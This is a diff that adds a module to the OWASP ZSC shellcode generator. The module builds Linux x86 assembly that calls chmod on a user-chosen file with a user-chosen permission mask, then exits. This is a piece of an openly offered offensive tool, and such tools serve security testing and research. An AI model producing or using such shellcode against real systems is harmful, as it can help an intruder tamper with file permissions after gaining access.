@@ -1,0 +1,40 @@
+"""
+OWASP ZSC
+https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
+https://github.com/zscproject/OWASP-ZSC
+http://api.z3r0d4y.com/
+https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
+"""
+from new_cores import base_module
+from cores import stack
+
+
+# from lib.opcoder.linux_x86 import convert
+
+
+class Module(base_module.BaseModule):
+    __commands__ = (
+        "back",
+        "set",
+        "show_options",
+    )
+    permission_mask = base_module.OptString("", "Perm Num")  # TODO improve descr
+    file_dest = base_module.OptString("", "File Target")  # TODO improve descr
+
+    def generate(self):
+        payload = "push   $0x0f\n"
+        payload += "pop    %%eax\n"
+        payload += stack.generate(self.permission_mask, '%ecx', 'int')
+        payload += stack.generate(self.file_dest, '%ebx', 'string')
+        payload += "mov    %%esp,%%ebx\n"
+        payload += "int    $0x80\n"
+        payload += "mov    $0x01,%%al\n"
+        payload += "mov    $0x01,%%bl\n"
+        payload += "int    $0x80"
+        return payload
+
+    def run(self):
+        if not self.permission_mask or not self.file_dest: # TODO fix here by module_required
+            print("Option is required")
+        else:
+            print(self.generate())  # TODO set write file or print here
